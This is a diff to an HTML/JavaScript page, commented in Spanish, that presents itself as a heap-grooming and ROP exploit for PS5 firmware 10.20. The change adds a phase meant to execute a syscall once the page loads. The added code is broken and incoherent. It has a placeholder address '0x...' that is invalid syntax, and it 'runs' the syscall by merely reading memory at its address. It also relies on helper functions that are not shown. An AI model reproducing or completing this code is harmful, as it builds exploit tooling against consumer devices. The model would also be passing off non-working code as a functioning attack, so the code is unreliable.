@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>Exploit PS5 - Heap Grooming + ROP</title>
+  <title>Exploit PS5 - Heap Grooming + ROP + Syscall</title>
   <script>
     // Funciones auxiliares para manipulación de objetos en el heap
     function hex(n) {
@@ -74,16 +74,33 @@
       if (leaked !== 0) {
         document.body.innerHTML = `<h1 style="color:red;">🚨 ROP Chain activada!</h1>`;
         console.log(`Valor de la dirección: ${hex(leaked)}`);
-        // Aquí podría ir el código para ejecutar syscalls
+        
+        // Ahora ejecutamos la syscall
+        executeSyscall(); // Llamamos a la función que ejecuta la syscall
       } else {
         document.body.innerHTML = `<h1 style="color:green;">Exploit no exitoso</h1>`;
       }
+    }
+
+    // Fase 4: Ejecutar una syscall (ejemplo: sys_getpid)
+    function executeSyscall() {
+      // Dirección de la syscall sys_getpid (esto depende de los offsets reales de PS5)
+      let syscallAddr = 0x...;  // Debes poner la dirección real de sys_getpid aquí
+      let ropChain = buildROP();
+
+      // Sobrescribir la dirección de la syscall en la ROP chain
+      write64(ropChain[0], syscallAddr);
+      
+      // Intentamos ejecutar la syscall y leer el resultado
+      let result = read64(syscallAddr);
+      console.log(`Resultado de la syscall: ${result}`);
+      document.body.innerHTML = `<h1>Resultado de la syscall: ${result}</h1>`;
     }
 
     window.onload = exploit;
   </script>
 </head>
 <body>
-  <h1>Ejecutando Exploit de Heap Grooming + ROP en PS5 FW 10.20...</h1>
+  <h1>Ejecutando Exploit de Heap Grooming + ROP + Syscall en PS5 FW 10.20...</h1>
 </body>
 </html>
